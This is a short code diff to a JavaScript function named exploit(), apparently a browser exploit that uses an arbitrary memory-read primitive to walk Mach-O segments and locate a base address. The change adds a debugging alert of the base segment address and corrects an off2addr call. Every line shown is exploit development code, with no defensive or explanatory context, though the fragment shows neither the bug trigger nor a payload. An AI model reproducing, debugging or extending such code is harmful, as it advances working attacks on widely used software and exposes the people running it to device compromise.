@@ -635,6 +635,7 @@ function exploit(){
             if(seg.fileoff.hi() == 0 && seg.fileoff.lo() == 0 && (seg.size.hi() != 0 || seg.size.lo() != 0))
             {
                 base_seg = seg;
+                alert(base_seg.addr)
             }
         }
         if(base_seg == null)
@@ -697,7 +698,7 @@ function exploit(){
         
             var m = i * 0x20;
             alert(memory.u32(Add(Add(imgs,m),0x18)))
-            var straddr = off2addr(segs, memory.u32(Add(Add(imgs,m),0x18)));
+            var straddr = off2addr(base_seg, memory.u32(Add(Add(imgs,m),0x18)));
             var fn = function(i)
             {
                 var g = memory.copyfrom(Add(straddr, i),0,50);
